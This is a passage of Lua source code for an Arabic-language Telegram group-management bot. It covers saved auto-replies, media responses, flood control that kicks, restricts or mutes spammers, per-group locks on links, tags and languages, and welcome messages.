local List = DevJoker:smembers(BlAcK..'Joker:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevJoker:sadd(BlAcK..'Joker:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local Joker = "᥀︙تم حفظ الرد رقم ↫ "..(#List+1).."\n᥀︙قم بارسال الرد رقم ↫ "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Joker).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevJoker:sismember(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,text) then
local BlAcKTeam =  DevJoker:smembers(BlAcK..'Joker:Text:GpTexts'..text..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, '['..BlAcKTeam[math.random(#BlAcKTeam)]..']' , 1, 'md')  
end
end
--     Source BlAcK     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevJoker:get(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevJoker:get(BlAcK..'DelManagerRep'..msg.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevJoker:del(BlAcK..'Joker:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'DelManagerRep'..msg.chat_id_)
return false
end
DevJoker:del(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevJoker:get(BlAcK..'Joker:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevJoker:set(BlAcK..'Joker:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevJoker:set(BlAcK..'Joker:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevJoker:set(BlAcK..'Joker:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevJoker:set(BlAcK..'Joker:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevJoker:set(BlAcK..'Joker:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevJoker:set(BlAcK..'Joker:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevJoker:set(BlAcK..'Joker:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevJoker:set(BlAcK..'Joker:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevJoker:del(BlAcK..'Joker:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevJoker:get(BlAcK..'Joker:Lock:GpRed'..msg.chat_id_) then 
if DevJoker:get(BlAcK..'Joker:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK..'Joker:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevJoker:get(BlAcK..'Joker:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK..'Joker:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevJoker:get(BlAcK..'Joker:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK..'Joker:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevJoker:get(BlAcK..'Joker:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK..'Joker:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevJoker:get(BlAcK..'Joker:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK..'Joker:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevJoker:get(BlAcK..'Joker:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK..'Joker:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevJoker:get(BlAcK..'Joker:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK..'Joker:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevJoker:get(BlAcK..'Joker:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function BlAcKTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevJoker:get(BlAcK..'Joker:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevJoker:get(BlAcK..'Joker:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, BlAcKTeam)
end
end
--     Source BlAcK     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevJoker:get(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevJoker:get(BlAcK..'DelSudoRep')
DevJoker:del(BlAcK.."Joker:Sudo:AllRed",DelSudoRep)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevJoker:del(BlAcK.."Joker:Add:AllText"..msg.sender_user_id_)
DevJoker:del(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
DevJoker:del(BlAcK.."DelSudoRep")
return false
end
DevJoker:del(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevJoker:get(BlAcK.."Joker:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevJoker:set(BlAcK.."Joker:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevJoker:set(BlAcK.."Joker:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevJoker:set(BlAcK.."Joker:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevJoker:set(BlAcK.."Joker:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevJoker:set(BlAcK.."Joker:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevJoker:set(BlAcK.."Joker:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevJoker:set(BlAcK.."Joker:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevJoker:set(BlAcK.."Joker:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevJoker:del(BlAcK.."Joker:Add:AllText"..msg.sender_user_id_)
DevJoker:del(BlAcK..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevJoker:get(BlAcK..'Joker:Lock:AllRed'..msg.chat_id_) then
if DevJoker:get(BlAcK.."Joker:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK.."Joker:Video:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK.."Joker:File:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK.."Joker:Voice:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK.."Joker:Audio:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK.."Joker:Photo:AllRed"..msg.content_.text_))
end
if  DevJoker:get(BlAcK.."Joker:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevJoker:get(BlAcK.."Joker:Gif:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevJoker:get(BlAcK.."Joker:Stecker:AllRed"..msg.content_.text_))
end
if DevJoker:get(BlAcK.."Joker:Text:AllRed"..msg.content_.text_) then
function BlAcKTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevJoker:get(BlAcK..'Joker:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevJoker:get(BlAcK.."Joker:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, BlAcKTeam)
end
end 
--     Source BlAcK     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevJoker:sismember(BlAcK..'Joker:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevJoker:sadd(BlAcK..'Joker:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '᥀︙العضو ↫ '..GetName..' \n᥀︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions BlAcK --
--     Source BlAcK     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= BlAcK then
floods = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevJoker:get(BlAcK.."Joker:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevJoker:setex(BlAcK.."Joker:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevJoker:hget(BlAcK.."Joker:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source BlAcK     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(BlAcK) then
DevJoker:set(BlAcK..'Joker:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevJoker:get(BlAcK..'Joker:PinnedMsg'..msg.chat_id_)
if pin_id and DevJoker:get(BlAcK..'Joker:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevJoker:get(BlAcK..'Joker:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevJoker:del(BlAcK..'Joker:viewget'..msg.sender_user_id_)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevJoker:del(BlAcK..'Joker:viewget'..msg.sender_user_id_)
end
end
--     Source BlAcK     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevJoker:get(BlAcK..'Joker:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source BlAcK     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevJoker:get(BlAcK..'Joker:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevJoker:get(BlAcK..'Joker:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevJoker:get(BlAcK..'Joker:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevJoker:get(BlAcK..'Joker:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevJoker:get(BlAcK..'Joker:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source BlAcK     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source BlAcK     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevJoker:get(BlAcK..'Joker:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@BLACK_TEAM_4]'))
Dev_Joker(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevJoker:get(BlAcK.."Joker:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source BlAcK     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevJoker:get(BlAcK..'Joker:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = BlAcK,offset_ = 0,limit_ = 1},function(extra,Joker,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(BlAcK) then 
if DevJoker:sismember(BlAcK..'Joker:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevJoker:get(BlAcK.."Joker:Text:BotWelcome") then JokerText = DevJoker:get(BlAcK.."Joker:Text:BotWelcome") else JokerText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevJoker:get(BlAcK.."Joker:Photo:BotWelcome") then JokerPhoto = DevJoker:get(BlAcK.."Joker:Photo:BotWelcome") elseif Joker.photos_[0] then JokerPhoto = Joker.photos_[0].sizes_[1].photo_.persistent_id_ else JokerPhoto = nil end 
if JokerPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,JokerPhoto,JokerText)
else 
send(msg.chat_id_,msg.id_,JokerText)
end 
end   
end
end,nil)
end
if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevJoker:get(BlAcK.."Joker:Lock:Welcome"..msg.chat_id_) then
if DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..msg.chat_id_) then
